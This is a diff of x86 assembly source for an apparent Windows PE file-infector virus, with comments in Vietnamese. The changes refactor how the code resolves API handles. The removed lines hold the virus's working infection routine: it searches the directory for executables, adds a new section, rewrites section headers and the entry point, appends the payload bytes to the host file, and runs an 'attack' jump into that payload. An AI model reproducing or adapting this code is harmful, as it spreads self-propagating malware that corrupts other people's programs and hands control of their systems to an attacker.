@@ -3,7 +3,6 @@
 .stack 100h
 option casemap:none
 .code
-payload:
 WIN32_FIND_DATAA STRUC
     dwFileAttributes     dd ?
     ftCreationTimeLow    dd ?
@@ -170,6 +169,9 @@ endFindAddress:
 	mov dword ptr [ebp + offset handleLoadLibrary] , eax ; luu lai
 	mov dword ptr [ebp + offset handleKernel32] , esi
 	;gio da co 2 handle cua ham quan trong nhat gio chi can duyet file cac kieu thoi nhi
+	;------------------------------------------------------
+	;------------------chuan bi cac handle------------------
+	;=======================================================
 	;MessageBox
 	mov edx , offset user32 ; lay handle cua thu vien user32
 	add edx , ebp
@@ -184,8 +186,65 @@ endFindAddress:
 	call dword ptr [ebp + offset handleGetProcAddress] ; lay handle cua messagename
 	
 	mov dword ptr [ebp + offset handleMessageBoxA] , eax ;; luu lai 
-	;-------------------------------------------------
-	;-------------------------------------------------
+	;GetModuleFileNameAName
+	mov edx , offset GetModuleFileNameAName
+	add edx , ebp
+	push edx 
+	push dword ptr [ebp + offset handleKernel32]
+	call dword ptr [ebp + offset handleGetProcAddress]
+	mov dword ptr [ebp + offset handleGetModuleFileNameA] , eax ; lay handle ham lay duong dan file dang chay
+	;CloseHandleName
+	mov edx , offset CloseHandleName
+	add edx , ebp
+	push edx 
+	push dword ptr [ebp + offset handleKernel32]
+	call dword ptr [ebp + offset handleGetProcAddress]
+	mov dword ptr [ebp + offset handleCloseHandle] , eax ; lay duong dan ham dong handle
+	;FindFirstFileAName
+	mov edx , offset FindFirstFileAName
+	add edx , ebp
+	push edx
+	push esi
+	call dword ptr [ebp + offset handleGetProcAddress]
+	mov dword ptr [ebp + offset handleFindFirstFileA] , eax ; lau handle cua ham duyet file
+	;----------------------------
+	;FindNextFileA 
+	mov edx , offset FindNextFileAName
+	add edx , ebp
+	push edx 
+	push dword ptr [ebp + offset handleKernel32]
+	call dword ptr [ebp + offset handleGetProcAddress]
+	mov dword ptr [ebp + offset handleFindNextFileA] , eax ; lau handle findNextFile
+	
+	;-------------------------------
+	mov edx , offset RtlZeroMemoryName; lay handle cua ham reset vung nho
+	add edx , ebp
+	push edx 
+	push dword ptr [ebp + offset handleKernel32]
+	call dword ptr [ebp +offset handleGetProcAddress]
+	mov dword ptr [ebp + offset handleRtlZeroMemory] , eax
+	
+	;=======================================================
+	;---------Ket thuc chuan bi cac ham--------------------
+	;------------------------------------------------------
+	
+	
+	;----------------------------------------------------
+	;-------------Lay payload va cac thu can thiet--------
+	;=====================================================
+	mov eax , offset pathNow
+	add eax , ebp
+	push 100
+	push eax 
+	push 0
+	call dword ptr [ebp + offset handleGetModuleFileNameA]
+	
+	mov dword ptr [ebp + offset offsetString] , offset pathNow
+	call print	
+	
+	;======================================================
+	;-------ket thuc lay payload--------------------------
+	;------------------------------------------------------
 	mov edx , offset GetCurrentDirectoryName
 	add edx , ebp
 	push edx
@@ -208,12 +267,6 @@ nextLoopPath:
 	mov byte ptr [ebp + offset path + ecx] , "\"
 	mov byte ptr [ebp + offset path + ecx + 1] , "*"
 	;;da lay duoc thu muc can tim ------------------------------------
-	mov edx , offset FindFirstFileAName
-	add edx , ebp
-	push edx
-	push esi
-	call dword ptr [ebp + offset handleGetProcAddress]
-	mov dword ptr [ebp + offset handleFindFirstFileA] , eax ; lau handle cua ham duyet file
 	;;; duoc duong dan day du 
 	mov edx , offset wfd 
 	add edx , ebp 
@@ -224,15 +277,7 @@ nextLoopPath:
 	call dword ptr [ebp + offset handleFindFirstFileA] ; call FindFirstFileA de tim handle duyet file
 	mov dword ptr [ebp + offset handle] , eax ; luu vao handle
 	
-	;----------------------------
-	;FindNextFileA 
-	mov edx , offset FindNextFileAName
-	add edx , ebp
-	push edx 
-	push dword ptr [ebp + offset handleKernel32]
-	call dword ptr [ebp + offset handleGetProcAddress]
-	mov dword ptr [ebp + offset handleFindNextFileA] , eax ; lau handle findNextFile
-	;-------------------------------
+	
 	;; loop tung file
 loopFileok:
 	mov edx , offset wfd
@@ -252,12 +297,7 @@ loopFileok:
 	;--------Bat dau xu li lay file--------
 	;-----------------------------------------
 	;main
-	mov edx , offset  ; lay handle cua ham reset vung nho
-	add edx , ebp
-	push edx 
-	push dword ptr [ebp + offset handleKernel32]
-	call dword ptr [ebp +offset handleGetProcAddress]
-	mov dword ptr [ebp + offset handleRtlZeroMemory] , eax
+	
 	
 	mov edx , offset pathNew
 	add edx , ebp	
@@ -413,418 +453,16 @@ nextSection: ; neu section nay chua giong thi tiep tuc
 	;-------------------------------------------------------------
 	;-------------Day la file can phai lay lan---------------------
 	;==============================================================
-	;------------------chuan bi cac handle------------------
-	mov edx , offset GetModuleFileNameAName
-	add edx , ebp
-	push edx 
-	push dword ptr [ebp + offset handleKernel32]
-	call dword ptr [ebp + offset handleGetProcAddress]
-	mov dword ptr [ebp + offset handleGetModuleFileNameA] , eax ; lay handle ham lay duong dan file dang chay
-	
-	mov edx , offset CloseHandleName
-	add edx , ebp
-	push edx 
-	push dword ptr [ebp + offset handleKernel32]
-	call dword ptr [ebp + offset handleGetProcAddress]
-	mov dword ptr [ebp + offset handleCloseHandle] , eax ; lay duong dan ham dong handle
-	;------------------------------------------------------
 notInfected	:
-	;;bat dau lay lan
-	push 0 
-	push 0
-	push dword ptr [ebp + offset ifanew]
-	push dword ptr [ebp + offset handleFile]
-	call dword ptr [ebp + offset handleSetFilePointer]
-	
-	push 1
-	push 0
-	push 6
-	push dword ptr [ebp + offset handleFile]
-	call dword ptr [ebp + offset handleSetFilePointer]
-	
-	mov dword ptr [ebp + offset number] , 4
-	call read
-	
-	mov eax , dword ptr [ebp + offset data]
-	inc eax
-	mov dword ptr [ebp + offset data] , eax
-	push 1
-	push 0
-	push -4
-	push dword ptr [ebp + offset handleFile]
-	call dword ptr [ebp + offset handleSetFilePointer]
-	
-	mov eax , offset data
-	add eax , ebp
-	push 0
-	push 0
-	push 4
-	push eax
-	push dword ptr [ebp + offset handleFile]
-	call dword ptr [ebp + offset handleWriteFile]
-	;
-	
-	;--------------------------------
-	
-	
-	mov edx , offset pathNow
-	add edx , ebp
-	push 100
-	push edx 
-	push 0
-	call dword ptr [ebp + offset handleGetModuleFileNameA]
-	
-	mov edx , offset pathNow
-	add edx , ebp
-	push 0
-	push 128
-	push 3
-	push 0
-	push 0
-	push 80000000h
-	push edx
-	call dword ptr [ebp + offset handleCreateFile]
-	mov dword ptr [ebp + offset handleFileNow] , eax
 	
 	
 	
-	mov edx , offset data
-	add edx , ebp	
-	push 100
-	push edx 
-	call dword ptr [ebp + offset handleRtlZeroMemory]
 	
 	
-	push 0
-	push 0
-	push 60
-	push dword ptr [ebp + offset handleFileNow]
-	call dword ptr [ebp + offset handleSetFilePointer]
-	
-	mov dword ptr [ebp + offset number] , 4
-	call readNow
-	
-	push 0
-	push 0
-	push dword ptr [ebp + offset data]
-	push dword ptr [ebp + offset handleFileNow]
-	call dword ptr [ebp + offset handleSetFilePointer]
-	
-	push 1
-	push 0
-	push 248
-	push dword ptr [ebp + offset handleFileNow]
-	call dword ptr [ebp + offset handleSetFilePointer]
-loopFindPayload:	
-	push 1
-	push 0
-	push 36
-	push dword ptr [ebp + offset handleFileNow]
-	call dword ptr [ebp + offset handleSetFilePointer]
-	mov dword ptr [ebp + offset number] , 4
-	call readNow
-	cmp dword ptr [data] , 0
-	je nextet
-	cmp dword ptr [data] , 0E0000020h
-	jne loopFindPayload
-
-nextet:	;;;
-	push 1
-	push 0
-	push -32
-	push dword ptr [ebp + offset handleFileNow]
-	call dword ptr [ebp + offset handleSetFilePointer]
-	mov dword ptr [ebp + offset number] , 4
-	call readNow
-	mov edx , dword ptr [ebp + offset data]
-	mov dword ptr [ebp + offset virtualSize] , edx
-
 	
 	
-	push 1
-	push 0
-	push 4
-	push dword ptr [ebp + offset handleFileNow]
-	call dword ptr [ebp + offset handleSetFilePointer]
-	mov dword ptr [ebp + offset number] , 4
-	call readNow
-	mov edx , dword ptr [ebp + offset data]
-	mov dword ptr [ebp + offset rawSize] , edx
-
-	mov dword ptr [ebp + offset number] , 4
-	call readNow
-	mov edx , dword ptr [ebp + offset data]
-	mov dword ptr [ebp + offset rawAddress] , edx
-	;----------------------------------------------------------------
-	push 0 
-	push 0
-	push dword ptr [ebp + offset ifanew]
-	push dword ptr [ebp + offset handleFile]
-	call dword ptr [ebp + offset handleSetFilePointer]
 	
-	push 1
-	push 0
-	push 56 
-	push dword ptr [ebp + offset handleFile]
-	call dword ptr [ebp + offset handleSetFilePointer]
-	
-	mov dword ptr [ebp + offset number] , 4
-	call read
-	mov eax , dword ptr [ebp + offset data]
-	mov dword ptr [ebp + offset sectionAlignment] , eax
-		
-	mov dword ptr [ebp + offset number] , 4
-	call read
-	mov eax , dword ptr [ebp + offset data]
-	mov dword ptr [ebp + offset fileAlignment] , eax
-	
-	push 1
-	push 0
-	push 16 
-	push dword ptr [ebp + offset handleFile]
-	call dword ptr [ebp + offset handleSetFilePointer]
-	
-	mov dword ptr [ebp + offset number] , 4
-	call read
-	mov eax , dword ptr [ebp + offset data]
-	add eax , dword ptr [ebp + offset virtualSize]
-	mov ecx , dword ptr [ebp + offset sectionAlignment]
-	call alignFunc
-	mov dword ptr [ebp + offset data] , eax
-	
-	push 1
-	push 0
-	push -4
-	push dword ptr [ebp + offset handleFile]
-	call dword ptr [ebp + offset handleSetFilePointer]
-	
-	mov eax , offset data
-	add eax , ebp
-	push 0
-	push 0
-	push 4
-	push eax
-	push dword ptr [ebp + offset handleFile]
-	call dword ptr [ebp + offset handleWriteFile]
-	
-	push 1
-	push 0
-	push 164
-	push dword ptr [ebp + offset handleFile]
-	call dword ptr [ebp + offset handleSetFilePointer]
-loopSection:	
-	mov dword ptr [ebp + offset number] , 4
-	call read
-	cmp dword ptr [ebp + offset data] , 0
-	je changeSection
-	push 1
-	push 0
-	push 36
-	push dword ptr [ebp + offset handleFile]
-	call dword ptr [ebp + offset handleSetFilePointer]
-	jmp loopSection
-changeSection:
-	push 1
-	push 0
-	push -36
-	push dword ptr [ebp + offset handleFile]
-	call dword ptr [ebp + offset handleSetFilePointer]
-	
-	mov dword ptr [ebp + offset number] , 4
-	call read
-	mov eax , dword ptr [ebp + offset data]
-	mov dword ptr [ebp + offset vs1] , eax
-	
-	mov dword ptr [ebp + offset number] , 4
-	call read
-	mov eax , dword ptr [ebp + offset data]
-	mov dword ptr [ebp + offset va1] , eax
-	mov dword ptr [ebp + offset number] , 4
-	call read
-	mov eax , dword ptr [ebp + offset data]
-	mov dword ptr [ebp + offset rs1] , eax
-	mov dword ptr [ebp + offset number] , 4
-	call read
-	mov eax , dword ptr [ebp + offset data]
-	mov dword ptr [ebp + offset ra1] , eax
-	
-	push 1
-	push 0
-	push 16
-	push dword ptr [ebp + offset handleFile]
-	call dword ptr [ebp + offset handleSetFilePointer]
-	
-	mov eax , offset nameSectionPayload
-	add eax , ebp
-	push 0
-	push 0
-	push 8
-	push eax
-	push dword ptr [ebp + offset handleFile]
-	call dword ptr [ebp + offset handleWriteFile]
-	
-	
-	mov eax , offset virtualSize
-	add eax , ebp
-	push 0
-	push 0
-	push 4
-	push eax
-	push dword ptr [ebp + offset handleFile]
-	call dword ptr [ebp + offset handleWriteFile]
-	
-	mov eax , dword ptr [ebp + offset va1]
-	add eax , dword ptr [ebp + offset vs1]
-	mov ecx , dword ptr [ebp + offset sectionAlignment]
-	call alignFunc
-	mov dword ptr [ebp + offset data] , eax
-	
-	mov eax , offset data
-	add eax , ebp
-	push 0
-	push 0
-	push 4
-	push eax
-	push dword ptr [ebp + offset handleFile]
-	call dword ptr [ebp + offset handleWriteFile]
-	
-	mov eax , offset rawSize
-	add eax , ebp
-	push 0
-	push 0
-	push 4
-	push eax
-	push dword ptr [ebp + offset handleFile]
-	call dword ptr [ebp + offset handleWriteFile]
-	
-	mov eax , dword ptr [ebp + offset ra1]
-	add eax , dword ptr [ebp + offset rs1]
-	mov ecx , dword ptr [ebp + offset fileAlignment]
-	call alignFunc
-	mov dword ptr [ebp + offset data] , eax
-	
-	mov eax , offset data
-	add eax , ebp
-	push 0
-	push 0
-	push 4
-	push eax
-	push dword ptr [ebp + offset handleFile]
-	call dword ptr [ebp + offset handleWriteFile]
-	
-	
-	push 1
-	push 0
-	push 12
-	push dword ptr [ebp + offset handleFile]
-	call dword ptr [ebp + offset handleSetFilePointer]
-	
-	mov eax , offset charactic
-	add eax , ebp
-	push 0
-	push 0
-	push 4
-	push eax
-	push dword ptr [ebp + offset handleFile]
-	call dword ptr [ebp + offset handleWriteFile]
-	
-	push 0
-	push 0 
-	push dword ptr [ebp + offset ifanew]
-	push dword ptr [ebp + offset handleFile]
-	call dword ptr [ebp + offset handleSetFilePointer]
-	
-	push 1
-	push 0 
-	push 40
-	push dword ptr [ebp + offset handleFile]
-	call dword ptr [ebp + offset handleSetFilePointer]
-	
-	
-	mov dword ptr [ebp +offset number] , 4
-	call read
-	
-	mov eax , dword ptr [ebp + offset data]
-	mov dword ptr [ebp + offset entrypoint] , eax
-	
-	push 1
-	push 0 
-	push -4
-	push dword ptr [ebp + offset handleFile]
-	call dword ptr [ebp + offset handleSetFilePointer]
-	
-	mov eax , dword ptr [ebp + offset va1]
-	add eax , dword ptr [ebp + offset vs1]
-	mov ecx , dword ptr [ebp + offset sectionAlignment]
-	call alignFunc
-	add eax , 81
-	mov dword ptr [ebp + offset data] , eax
-	mov eax , offset data
-	add eax , ebp
-	push 0
-	push 0
-	push 4
-	push eax
-	push dword ptr [ebp + offset handleFile]
-	call dword ptr [ebp + offset handleWriteFile]
-	;
-	
-	push 1
-	push 0 
-	push 192
-	push dword ptr [ebp + offset handleFile]
-	call dword ptr [ebp + offset handleSetFilePointer]
-	
-	mov eax , offset entrypoint
-	add eax , ebp
-	push 0
-	push 0
-	push 4
-	push eax
-	push dword ptr [ebp + offset handleFile]
-	call dword ptr [ebp + offset handleWriteFile]
-	;;;append payload
-	
-	
-	push 0
-	push 0
-	push dword ptr [ebp + offset rawAddress]
-	push dword ptr [ebp + offset handleFileNow]
-	call dword ptr [ebp + offset handleSetFilePointer]
-	
-	
-	mov eax , dword ptr [ebp + offset ra1]
-	add eax , dword ptr [ebp + offset rs1]
-	mov ecx , dword ptr [ebp + offset fileAlignment]
-	call alignFunc
-	 
-	push 2
-	push 0 
-	push 0
-	push dword ptr [ebp + offset handleFile]
-	call dword ptr [ebp + offset handleSetFilePointer]
-	
-loopAppend:
-	mov eax , dword ptr [ebp + offset i]
-	cmp eax ,dword ptr [ebp + offset rawSize]
-	je nextokk
-	mov dword ptr [ebp + offset number] , 1
-	call readNow
-	mov eax , offset data
-	add eax , ebp
-	push 0
-	push 0
-	push 1
-	push eax
-	push dword ptr [ebp + offset handleFile]
-	call dword ptr [ebp + offset handleWriteFile]
-	inc dword ptr [ebp + offset i]
-	jmp loopAppend
-nextokk:
-	;closehandle
-	push dword ptr [ebp + offset handleFileNow]
-	call dword ptr [ebp + offset handleCloseHandle]
-	;;
+	;;=====================close============================
 	jmp loopFileok
 	;---------------------------------------------
 	;-----Ket thuc xu li lay file-------------------
@@ -833,38 +471,21 @@ nextokk:
 endMain:
 	;------------------------------------------------
 	;-----------Bat dau virus tan cong---------------
-	;------------------------------------------------
-	;attack:
+	;===============================================
 	mov dword ptr [ebp + offset offsetString] , offset notificationMalware
-	call print
-	
-	push 0
-	push 0
-	push 60
-	push dword ptr [ebp + offset pathNow]
-	call dword ptr [ebp + offset handleSetFilePointer]
-	mov dword ptr [ebp + offset number] , 4
-	call read
-	mov eax , dword ptr [ebp + offset data]
-	add eax , 236
-	push 0
-	push 0 
-	push eax
-	push dword ptr [ebp + offset handleFile]
-	call dword ptr [ebp + offset handleSetFilePointer]
-	mov dword ptr [ebp + offset number] , 4
-	call read
-	cmp dword ptr [ebp + offset data] , 0
-	je endattack
-	mov eax , dword ptr [ebp + data]
-	add eax , ebp
-	jmp eax
-endattack:	
-	;------------------------------------------------
+	call print	
+	;=================================================
 	;-----------Ket thuc virus tan cong---------------
 	;------------------------------------------------
 	;endattack
 ;data---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+payload db 1000 dup (0)
+virtualSize dd ?
+rawSize dd ?
+rawAddress dd ?
+virtualAddress dd ?
+
+
 entrypoint dd ?
 i dd 0
 handleFileAppend dd ?
@@ -875,9 +496,7 @@ rs1 dd ?
 ra1 dd ?
 sectionAlignment dd ?
 fileAlignment dd ?
-virtualSize dd ?
-rawSize dd ?
-rawAddress dd ?
+
 CloseHandleName db "CloseHandle" , 0
 handleCloseHandle dd ?
 handleFileNow dd ?
@@ -922,8 +541,7 @@ handle dd ?
 handleFile dd ?
 pathNew db 100 dup (0)
 data db 100 dup (0)
-flagCheckExe db 0
-virtualAddress dd ?
+flagCheckExe db ?
 ifanew dd ?
 sectionNumber dw ?
 wfd WIN32_FIND_DATAA <>
